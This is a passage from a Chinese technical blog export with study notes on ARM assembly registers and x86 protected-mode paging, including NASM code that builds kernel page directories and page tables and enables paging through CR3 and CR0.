<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/image-20221113170529058.png" class="" title="image-20221113170529058">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86平坦模型</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM汇编笔记</title>
    <url>/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ARM汇编的一些知识"><a href="#ARM汇编的一些知识" class="headerlink" title="ARM汇编的一些知识"></a>ARM汇编的一些知识</h2><h3 id="寄存器数量"><a href="#寄存器数量" class="headerlink" title="寄存器数量"></a>寄存器数量</h3><p>ARM处理器一共有37个32位寄存器。<br>30个为“通用“寄存器： r0-r14<br>未分组：r0-r7，即只有一个寄存器<br>分 组：r8-r14，即有多个同名寄存器<br>r8-r12 ：两个<br>r13-r14：6个 r13(sp),R14(lr)<br>1个固定的程序计数器 ： pc (又称r15)<br>6个为状态寄存器 ： cpsr spsr<br>不能被同时访问,一种模式下最多同时访问18个寄存器</p>
<span id="more"></span>

<h3 id="不同模式下访问的寄存器"><a href="#不同模式下访问的寄存器" class="headerlink" title="不同模式下访问的寄存器"></a>不同模式下访问的寄存器</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/dec5072d-4029-4f77-ba02-4db3edea2f3a.png" class="" title="img">

<h3 id="寄存器用途"><a href="#寄存器用途" class="headerlink" title="寄存器用途"></a>寄存器用途</h3><p>sp(r13) - 堆栈指针<br>lr(r14) - 连接寄存器<br>调用子程序时存放调用地址,存放返回地址<br>pc(r15) - 程序计数器,相当于windows的EIP<br>(1)跳转到指定地址<br>mov pc,lr// 直接修改pc ，完成跳转<br>bx lr // 跳转到 lr保存的地址</p>
<p>(2)在函数入口保存寄存器信息<br>stmfd sp!, {r11,lr} // 保存大括号中的寄存器到栈中，从右往左</p>
<p>(3)使用ldm指令修改pc,完成函数返回<br>ldmfd sp!, {r11,pc} // 将栈中数据依次加载到寄存器中，从左往右</p>
<p>cpsr – 当前程序状态寄存器<br>spsr–备份的程序状态寄存器</p>
<h3 id="条件执行后缀"><a href="#条件执行后缀" class="headerlink" title="条件执行后缀"></a>条件执行后缀</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/976cd38d-47ac-4158-b029-2d8df50def19.png" class="" title="img">

<h3 id="ARM的指令流水线"><a href="#ARM的指令流水线" class="headerlink" title="ARM的指令流水线"></a>ARM的指令流水线</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/06750ce2-c439-4dc2-97f1-676ed097cef4.png" class="" title="img">

]]></content>
      <categories>
        <category>ARM汇编</category>
      </categories>
  </entry>
  <entry>
    <title>分页和动态页面分配</title>
    <url>/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[<h2 id="01-保护模式下的段式虚拟内存管理"><a href="#01-保护模式下的段式虚拟内存管理" class="headerlink" title="01. 保护模式下的段式虚拟内存管理"></a>01. 保护模式下的段式虚拟内存管理</h2><span id="more"></span>

<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/62bfe0734f409c5d5c8112070c36e1c1-16683301558173.png" class="">
<p>任务的划分实际上是内存空间的划分</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/036caff772c8fd8009a012aaf154b714-16683301558161.png" class="">
<p>内存空间的访问时依靠分段机制进行的，是通过将内存划分为段来进行的。现在描述符表中定义每个段的描述符，然后通过描述符来访问其对应的内存段。</p>
<p>程序中先将段选择子送入段寄存器<strong>sreg</strong>中，再使用<mark>jmp、call</mark>指令进行跳转。其中段选择子的<strong>TI = 0</strong>表示描述符再GDT中，<strong>TI = 1</strong>表示在LDT中。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fe2e91264c510777c1f5ab83f4ed81e3-16683301558172.png" class="">
<p>每个任务的描述符索引是13位，最多<strong>2^13 = 8192</strong>个，段内偏移是32位的，段的最大长度是<strong>2^32 = 4GB</strong>，则任务的全局部分为<strong>2^13 * 2^32 = 2^45 = 32TB</strong>，任务的私有部分为<strong>2^13 * 2^32 = 2^45 = 32TB</strong>，则一个任务的理论总大小为<strong>64TB</strong>。在一个多任务系统中，还有其他多个任务。但是32跟地址线最多能寻址4GB的物理内存空间。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3a4cfb5324b487b51a585fe54fc56503-16683301558174.png" class="">
<p>上图中，任务的全局部分占用物理内存的高2G字节，任务的私有部分占用物理内存的低2G字节</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/bb0b37403a3132f2c94521f606306756-16683301558175.png" class="">
<p>开始将所有段的<strong>P位</strong>清零，表示暂时不在内存中，把要访问的段<strong>P位置1</strong>，将其调入物理内存中</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7926fbcef13874a2671f401b9a37b35f-16683301558176.png" class="">
<p>将段1置换到外部磁盘、将段1的<strong>P位</strong>清零、将段3置换到物理内存、将段3的<strong>P位</strong>置1</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/584e40306c3dc5a8a811fe0e018ba3d2-16683301558178.png" class="">
<p>下次访问段1，发现<strong>P = 0</strong>，首先将其置换到物理内存中、再将段3的<strong>P位</strong>清零、再将段1的<strong>P位</strong>置1.使用上述这种方式实现<strong>段式虚拟内存管理策略</strong>。</p>
<p>实际中，段有大有小当内存空间不足时需要进行段的换入换出，置换出当前使用最少的段。在描述符中有一个特殊的<strong>位A</strong>，表示以访问位。当处理器访问一个段时，自动将<strong>A</strong>置1，根据<strong>A位</strong>被改变的频次可以知道哪些段是是用最少的，就能对其进行置换。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/34904d9c5835832a2e72d6ea283c84ff-16683301558177.png" class="">
<p>如上图，由于段的长度不同，在进行段的换入换出之后，虽然内存中剩余容量足够，但是内存不连续，也导致不能被使用。就如<strong>段5</strong>无法被调入内存。<strong>x86</strong>使用了内存分页技术解决这个问题，将物理内存分为大小相同的页，并将长度不同的段映射近长度相同的页。</p>
<h2 id="02-每个任务独立的虚拟内存"><a href="#02-每个任务独立的虚拟内存" class="headerlink" title="02. 每个任务独立的虚拟内存"></a>02. 每个任务独立的虚拟内存</h2><p>每个任务都分配一个4GB的虚拟内存空间低一半<mark>0x00000000 ~ 0x7FFFFFFF</mark>为私有部分，高一半<mark>0x80000000 ~ 0xFFFFFFFF</mark>为全局部分。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/d47a393d2fdb43c0a19a9c42d2c3e708-16683301558179.png" class="">
<p>在多任务系统中，任务的全局部分共有，私有部分独立：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/c75045c9e153d106f0ee9c46e78b4d21-166833015581710.png" class="">
<p>重新规划任务的内存空间：全局部分和私有部分各有2GB，如下，若私有部分有5个段，分别映射到2GB字节虚拟内存中。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6bbc331d521c2b23008955260caf01da-166833015581712.png" class="">


<h2 id="03-物理内存的分页以及段到页的拆分"><a href="#03-物理内存的分页以及段到页的拆分" class="headerlink" title="03. 物理内存的分页以及段到页的拆分"></a>03. 物理内存的分页以及段到页的拆分</h2><p>任务对应为一些文件，最主要的可执行文件包含代码段、数据段、栈段以及段的实际内容，其他文件可以是工作文档、图像、视频文件等等，可以被加载到数据段中进行处理。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93616ac55c672e94aecb012e18395328-166833015581713.png" class="">
<p>内核有自己的可执行文件和其它文件，是所有任务共享的，每个任务都有自己的可执行文件和其他文件。</p>
<p>当任务执行时，要把可执行文件都映射到自己的虚拟内存，映射就是计算每个段在虚拟内存中的起始位置和长度，然后创建和安装其描述符。</p>
<p>映射之后，下一步工作是将段进行切分，然后加载到物理内存。物理内存是4G字节，每一部分都是一个页，页的最小长度是4KB。之后就是将虚拟内存中的段进行4K字节的拆分映射到物理内存中</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/36a2e0300007314f584d45006d3de7ad-166833015581711.png" class="">
<p>如上图，在虚拟内存中的12606字节的段被划分到占3个4096字节完整的页 + 1个占318字节的页中。即使不足4KB也要按照4KB进行映射</p>
<p>段是连续的，页不需要是连续的。在内存中闲置的页和被占用的页是随机交错存在的，无法保证哪些页被释放哪些页被占用。也就无法保证分配的页在什么位置</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/5287f633388a52beac4c4258391c5a66-166833015581715.png" class="">
<p>对内存的分页是逻辑上的、而不是物理上的。同时页的起始位置也有要求，对于4KB的页来说，起始位置必须是4096字节（即0x1000)的整倍数。</p>
<p>课后练习题：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/885d06e0f92aa2df15899b4f9094e35a-166833015581714.png" class="">

<h2 id="04-处理器的段部件和页部件"><a href="#04-处理器的段部件和页部件" class="headerlink" title="04. 处理器的段部件和页部件"></a>04. 处理器的段部件和页部件</h2><p>分页（paing：名词，表示以页为基础的内存管理模式），开启分页机制后，在程序执行前，要把可执行文件中的段映射到虚拟内存，然后再把段中的内容加载到物理内存中的页。</p>
<p>为什么要引入虚拟内存、要把程序映射到虚拟内存呢？<br>Intel处理器是按照分段机制工作的，只不过在分页模式下，段是安排在虚拟内存的。将程序映射到虚拟内存就是规划所有段在虚拟内存中的布局和位置。并根据这些信息来创建段描述符</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/340687599ee7c41b66cadb4e85366328-166833015581717.png" class="">
<p>如上图，处理器只是规划可执行文件在虚拟内存中的布局，并不会把代码加载进虚拟内存中。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/ccb29b4b220f40bfa03a583e0251bfd4-166833015581716.png" class="">
<p>在没有开启分页机制时，段部件输出的地址就是物理地址</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93b5bdef561fe3821708a0f77fa511f9-166833015581718.png" class="">
<p>开启分页机制后，段部件输出的地址就是线性地址，线性地址是虚拟内存中的地址，要传送给页部件，页部件用来将线性地址转换为物理地址</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b1f267f0104a6773190214d35953bd65-166833015581719.png" class="">
<p><strong>页部件</strong>将<strong>段部件</strong>传送来的<strong>线性地址</strong>转换为<strong>物理地址</strong>。<strong>页部件</strong>将<strong>线性地址</strong>拆分成<strong>页地址</strong>和<strong>页内偏移</strong>，再将<strong>页地址</strong>修改为<strong>真实的物理页地址</strong>即可。如线性地址<strong>0x00201000</strong>，页部件将页地址转换为<strong>0x00004000</strong>、偏移为<strong>0xCC</strong>，则转换后的地址就是<strong>0x000040CC</strong>。</p>
<h2 id="05-从线性地址到物理地址的转换过程"><a href="#05-从线性地址到物理地址的转换过程" class="headerlink" title="05. 从线性地址到物理地址的转换过程"></a>05. 从线性地址到物理地址的转换过程</h2><p>线性地址到物理地址的转换：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0b3f8e4539156e697b30c8330722dcef-166833015581721.png" class="">
<p><strong>线性地址的前20位</strong>对应<strong>物理地址的前20位</strong>。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/079466d3ffa8514574fe5a7827cc4ff0-166833015581722.png" class="">
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b771000981bd8fddea1731849f08ee2a-166833015581720.png" class="">
<p>每个表项占4个字节，所以访问表项时，使用虚拟页地址的<strong>高20位</strong>乘以4</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/4defd07ca51dd0f680870b47b4bd5557-166833015581724.png" class="">

<ul>
<li>段描述符的基地址 + 指令中的偏移量传送给段部件</li>
<li>段部件输出线性地址<strong>0x0020010C8</strong></li>
<li>线性地址的<strong>高20</strong>位<strong>乘以4</strong>去访问表项取出物理页地址的<strong>高20位</strong></li>
<li>线性地址的<strong>低12位</strong>和上一步取出物理页地址的<strong>高20位</strong>结合形成物理地址</li>
<li>使用这个物理地址访问内存<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6c560a13f33c3a4ab7c0e856e07fce62-166833015581723.png" class="">
各个任务都有自己独立的4GB虚拟内存空间和独立的页映射表。</li>
</ul>
<p>课后作业：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a89f73cb347d517ecd51ad35d5df478d-166833015581725.png" class="">


<h2 id="06-页目录和页表及其地址转换过程"><a href="#06-页目录和页表及其地址转换过程" class="headerlink" title="06. 页目录和页表及其地址转换过程"></a>06. 页目录和页表及其地址转换过程</h2><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/beb5acd012b007f792699b63338eff0f-166833015581727.png" class="">
<p>页映射表需要<strong>4MB</strong>大小</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/763bc09ba5fc0f5dd61cd15b5c4af155-166833015581726.png" class="">
<p>页映射表必须一开始就完全定义，而且会占用<strong>4MB</strong>内存空间。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fcf277bc282630c1024cc9525453f59f-166833015581829.png" class="">
<p>层次化的分页结构，即不采用单一的<strong>页映射表</strong>，使用<strong>页目录表</strong>和<strong>页表</strong>替代。<br><strong>页表</strong>中每个<strong>页表项</strong>占据4个字节（32位）用来存放<strong>物理页地址</strong>，共可保存1024个<strong>物理页地址</strong>，即每个<strong>页表</strong>大小为4KB。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/c7312b043bc27fce971c77a8debceca8-166833015581831.png" class="">
<p><strong>CR3</strong>存放当前任务<strong>页目录</strong>的物理地址，也叫做<strong>页目录基址寄存器</strong></p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/92e225986b4e3925e3d7e7642af46952-166833015581828.png" class="">
<p>没有开启分页机制时，段部件发出的地址就是物理地址<strong>0x00801050</strong><br>开启分页机制：</p>
<ul>
<li>段部件发出线性地址，处理器将其分为三部分（高10位、中间10位、低12位）</li>
<li>处理器从当前任务状态段<strong>TSS</strong>中取出<strong>CR3</strong>寄存器的值，里面存放的是当前任务所用的页目录物理基地址</li>
<li>接着将线性地址高10位乘以4得到页目录中的偏移，从页目录的这个地址中取出页表的物理基地址</li>
<li>接着将线性地址的中间10位乘以4得到其在页表中的偏移，从页表的这个地址中取出线性地址对应的物理基地址</li>
<li>接着使用这个基地址<strong>加上</strong>线性地址的低12位形成物理地址，这样就把段部件发出的线性地址转换为<strong>物理地址了</strong></li>
</ul>
<p><strong>其中乘以4时因为页目录和页表中每一项都是占据4个字节的，所以需要乘以4才能得到每一项在表中对应的偏移</strong>。</p>
<p>这种变化是事先安排好的，当程序加载时操作系统先创建虚拟的段，根据段地址的高20位来判断需要用到哪些页目录项和页表项，之后在物理内存中寻找空闲的页，并将页的物理地址填写到对应的页表项中，之后程序就可以按照这些值把线性地址转换为物理地址。</p>
<h2 id="07-设计内核的页目录和页表"><a href="#07-设计内核的页目录和页表" class="headerlink" title="07. 设计内核的页目录和页表"></a>07. 设计内核的页目录和页表</h2><p>本章程序：<br>引导程序：<strong>c13_mbr0.asm</strong><br>内核程序：<strong>c31_core0.asm</strong><br>用户程序1：<strong>c30_app0.asm</strong><br>用户程序2：<strong>c30_app1.asm</strong></p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/419baf206d393622a45a6df21ff7a1db-166833015581830.png" class="">
<p>系统中的执行顺序为：</p>
<ul>
<li>先创建页目录和页表、在虚拟内存中规划每个段的位置并创建段描述符</li>
<li>处理器的页部件从段部件输出的线性地址中提取前20位作为索引来访问页目录表和页表，看对应的物理页是否存在</li>
<li>如果页不存在，则在物理内存中搜索这个物理页，并将页的物理地址填写在页表中，这样就可以访问这个物理页</li>
<li>如果页存在，则直接访问这个页找到对应的物理地址以此访问这个页</li>
</ul>
<p>内核程序中，显示处理器品牌信息之后开始准备打开分页机制。但是此时内核是都开启页功能之前加载的，其内容在内存中的位置已经固定。此时要想当前执行流程在开启分页之后还能继续进行，就必须让段部件发出的线性地址等于页部件发出的物理地址</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f045a9fa5ce5ccbb02648df2229d15a8-166833015581832.png" class="">
<p>我们内核处于低端1MB，对低端1MB的内存特殊处理，让这部分的线性地址等于页部件转换之后的物理地址即可。那么这样做之后内核就不需要做任何变动就可以在分页机制下正常工作</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/234c965b022ff7b6681224e3a0062c63-166833015581833.png" class="">
<p>一个页表可以管理4MB内存，那么对于这个内核只需要一个页表即可。页目录和页表放在任何有效的物理内存地址都可，如上，放在<strong>0x00020000</strong>处。</p>
<h2 id="08-页目录项和页表项的组成格式"><a href="#08-页目录项和页表项的组成格式" class="headerlink" title="08. 页目录项和页表项的组成格式"></a>08. 页目录项和页表项的组成格式</h2><p>目的对于低端<strong>1MB</strong>内存，<strong>段部件发出的线性地址</strong>和<strong>页部件发出的物理地址</strong>相同。</p>
<p>创建页目录，将其清零：</p>
<pre><code class="assembly">    ;创建系统内核的页目录表PDT
    mov ecx,1024                       	;1024个目录项
    mov ebx,0x00020000                  ;页目录的物理地址
    xor esi,esi							;页目录表清零
.b1:
    mov dword [es:ebx+esi],0x00000000  	;页目录表项清零
    add esi,4
    loop .b1
</code></pre>
<p>页目录项、页表项的组成格式：在页目录中只保存了<mark>页<strong>表</strong>物理地址的高20位</mark>、在页表中只保存了<mark>页物理地址的高20位</mark>。因为页表和页目录要求是4K字节对齐，所以低12位为0</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/014976f410021c0c1e7c7413cd1827fb-166833015581836.png" class="">

<ul>
<li><strong>P位（Present）</strong>：1表示页表或页目录存在于内存中、0表示不在内存中，需要创建或从磁盘调入</li>
<li><strong>R/W位（Read/Write）</strong>：0页目录或页表只读、1表示可读可写</li>
<li><strong>US位（User/Supervisor）</strong>：1时表示所有特权级别的程序访问，0表示只有特权级0、1、2特权级的程序可以访问</li>
<li><strong>PWT位（Page Level Write-Through）</strong>：页级通写位，和高速缓存有关、通写是高速缓存的一种方式，0表示不允许使用此种方式提升页面访问效率、1表示允许</li>
<li><strong>PCD位（Page-Level Cache Disable）</strong>：高速缓存禁止位，0表示不使用高速缓存策略、1表示使用</li>
<li><strong>A位（Accessed）</strong>：由处理器固件设置，0表示此页未被访问过，1表示被访问过，操作系统定期将此位清零，通过此位被置1的次数了解此页的使用频率</li>
<li><strong>D位（Dirty）</strong>：由处理器固件设置，用来指示此表项的页已经写过数据。</li>
<li><strong>PAT位（Page-Attribute Table）</strong>：页属性表支持位，只对页表项起作用，页目录项中此位置0，和页高速缓存有关</li>
<li><strong>G位（Global）</strong>：指示该表项所指示的页是否为全局性质的，若页是全局的，他将会在高速缓存中一直保存，意味着地址转换的速度会很快</li>
<li><strong>AVL位（Available）</strong>：被处理器忽略，程序可以使用</li>
</ul>
<h2 id="09-创建内核的页表并初始化低端1MB对应的页表项"><a href="#09-创建内核的页表并初始化低端1MB对应的页表项" class="headerlink" title="09. 创建内核的页表并初始化低端1MB对应的页表项"></a>09. 创建内核的页表并初始化低端1MB对应的页表项</h2><p>在页目录内创建指向页目录自己的目录项：</p>
<pre><code class="assembly">    ;将页目录表的物理地址登记在它自己的最后一个页目录项内
    ;页目录也可以容纳1024个，从0到3FF，最后一项的偏移为3FF X 4 = 0xFFC = 4092
    mov dword [es:ebx+4092],0x00020003
</code></pre>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/e3c365f0007bf5d9b3833567346b3f4c-166833015581834.png" class="">
<p>程序前1MB占据一个页目录项和页表的前256个表项。修改页目录项的内容使其指向页表，填写的内容是页表的物理地址：<strong>0x00021000</strong>，该页位于内中，可读可写，但是不允许特权级别为3的程序访问，所以最终要填写<strong>0x00021003</strong>。</p>
<p>修改页目录中第一个表项的内容，使其指向页表：</p>
<pre><code class="assembly">    ;在页目录内创建与线性地址0x00000000对应的目录项
    mov dword [es:ebx+0],0x00021003    ;写入目录项（页表的物理地址和属性）
</code></pre>
<p>将低端1MB字节所包含的哪些页的物理地址按顺序填写到页表中：</p>
<pre><code class="assembly">    ;创建与上面那个目录项相对应的页表，初始化页表项
    mov ebx,0x00021000                 ;页表的物理地址
    xor eax,eax                        ;起始页的物理地址
    xor esi,esi
.b2:
    mov edx,eax
    or edx,0x00000003
    mov [es:ebx+esi*4],edx             ;登记页的物理地址
    add eax,0x1000                     ;下一个相邻页的物理地址
    inc esi
    cmp esi,256                        ;仅低端1MB内存对应的页才是有效的
    jl .b2
.b3:                                   ;其余的页表项置为无效
    mov dword [es:ebx+esi*4],0x00000000
    inc esi
    cmp esi,1024
    jl .b3
</code></pre>
<p>开启分页功能之后，页表和物理地址的映射关系：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/1cdef7a86047f1863b9f3ce7742d262d-166833015581835.png" class="">


<h2 id="10-设置控制寄存器CR3和CR0开启分页功能"><a href="#10-设置控制寄存器CR3和CR0开启分页功能" class="headerlink" title="10. 设置控制寄存器CR3和CR0开启分页功能"></a>10. 设置控制寄存器CR3和CR0开启分页功能</h2><p>开启分页：</p>
<pre><code class="assembly">    ;令CR3寄存器指向页目录，并正式开启页功能
    mov eax,0x00020000  ;PCD=PWT=0
    mov cr3,eax
    
    cli		;开启分页之前需要重新设置内核，不能发生中断，先关闭
    
    mov eax,cr0
    or eax,0x80000000
    mov cr0,eax			;开启分页机制
                        ;从这条指令开始，段部件产生的就是线性地址不是物理地址			
</code></pre>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/54d5c6a1dbf186708bbbdb66410eee24-166833015581837.png" class="">
<p>对控制寄存器使用MOV指令，和普通的MOV 指令不同，操作码不同</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b1c16fc5f1bca227f50ff84a7bd875e7-166833015581839.png" class="">
<p><strong>CR0</strong>寄存器的<strong>位31</strong>，<strong>PG</strong>位，0表示关闭分页、1表示开启分页。<strong>CR0</strong>的<strong>位0</strong>，<strong>PE</strong>位，0表示位于实模式、1表示位于保护模式。分页只能在保护模式下开启</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6ccae13d834791c7061285a74c59a792-166833015581838.png" class="">


<h2 id="11-在调试器中观察页目录表和页表"><a href="#11-在调试器中观察页目录表和页表" class="headerlink" title="11. 在调试器中观察页目录表和页表"></a>11. 在调试器中观察页目录表和页表</h2><p>写入程序：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/aecb11d2fe5887c73f36b8b825ac5b1b-166833015581840.png" class="">
<p>分页之前：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6c70462626d0d82f01f81c56083debb5-166833015581842.png" class="">
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/9b4f60cf5f2e43889d5600832c6904b4-166833015581841.png" class="">
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/d098a012924babbbd497fd1eccabb229-166833015581843.png" class="">
<p>使用<strong>info tab</strong>命令查看可知，此时分页是关闭的。其中<strong>CR0</strong>的<strong>PG位</strong>是小写，为0。<strong>PE位</strong>大写为1，处于保护模式。</p>
<p>开启分页：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/67b42d52f153a06592223adf2b7f4d47-166833015581845.png" class="">
<p><strong>GDT</strong>内第二个描述符的线性地址为<strong>0x00007E08</strong></p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0c417599ea065eef914819e2e1793415-166833015581844.png" class="">


<h2 id="12-准备将内核映射到虚拟内存的高端"><a href="#12-准备将内核映射到虚拟内存的高端" class="headerlink" title="12. 准备将内核映射到虚拟内存的高端"></a>12. 准备将内核映射到虚拟内存的高端</h2><p>页目录的<strong>高2G字节</strong>指向内核的页表、<strong>低2G字节</strong>指向任务的页表。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/acf80d1de43efe9f041004f4a3b904b0-166833015581846.png" class="">
<p>若页目录的<strong>高2GB</strong>不是指向内核的页表时，当从任务的私有部分转到内核执行时，段部件发出的地址一定是高于<strong>0x80000000</strong>的，此时就找不到内核所在的物理地址，无法完成地址转换。因此需要将内核映射到虚拟地址的高端</p>
